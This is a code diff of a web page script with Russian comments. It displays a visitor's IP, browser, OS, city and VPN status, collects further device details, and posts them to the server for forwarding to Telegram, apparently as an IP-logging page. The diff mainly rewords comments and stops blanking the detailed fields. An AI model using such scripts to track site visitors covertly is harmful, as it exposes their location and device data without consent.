@@ -2,7 +2,7 @@ window.addEventListener('DOMContentLoaded', () => {
   fetch('/collect')
     .then(res => res.json())
     .then(data => {
-      // На сайте показываем только базовую инфу
+      // Отображаем только базовую информацию на сайте
       document.getElementById('ip').textContent = data.ip || 'Unknown';
       document.getElementById('browser').textContent = data.browser || 'Unknown';
       document.getElementById('os').textContent = data.os || 'Unknown';
@@ -11,13 +11,7 @@ window.addEventListener('DOMContentLoaded', () => {
       document.getElementById('city').textContent = data.city || 'Unknown';
       document.getElementById('vpn').textContent = data.vpn ? 'Yes' : 'No';
 
-      // Остальные поля на сайте — пустые, чтобы не показывать подробную инфу
-      const emptyFields = ['timestamp', 'resolution', 'useragent', 'deviceType', 'networkType', 'cookies'];
-      emptyFields.forEach(id => {
-        document.getElementById(id).textContent = '';
-      });
-
-      // Собираем расширенную информацию для отправки в телеграм
+      // Собираем расширенную информацию
       const timestamp = new Date().toLocaleString();
       const resolution = `${window.screen.width} x ${window.screen.height}`;
       const useragent = navigator.userAgent;
@@ -31,7 +25,7 @@ window.addEventListener('DOMContentLoaded', () => {
 
       const cookies = navigator.cookieEnabled ? 'Yes' : 'No';
 
-      // Отправляем расширенную инфу на сервер
+      // Отправляем расширенную информацию на сервер для телеграма
       fetch('/clientinfo', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
